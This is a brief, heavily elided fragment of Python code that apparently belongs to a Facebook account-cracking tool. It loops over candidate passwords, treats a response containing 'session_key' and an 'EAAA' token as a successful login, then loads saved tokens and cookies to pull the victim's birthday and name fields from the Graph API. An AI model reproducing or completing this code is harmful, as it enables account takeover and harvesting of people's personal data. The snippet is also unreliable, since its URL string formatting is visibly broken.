    ...
    for pw in fii:
        ...
        if "session_key" in send.text and "EAAA" in send.text:
            ...
            try:
                token = open('login/token.json','r').read()
                cookie = {'cookie':open('login/cookie.json','r').read()}
                ttl = ses.get("https://graph.facebook.com/" + uid + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token="%token),cookies=cookie).json()["birthday"]
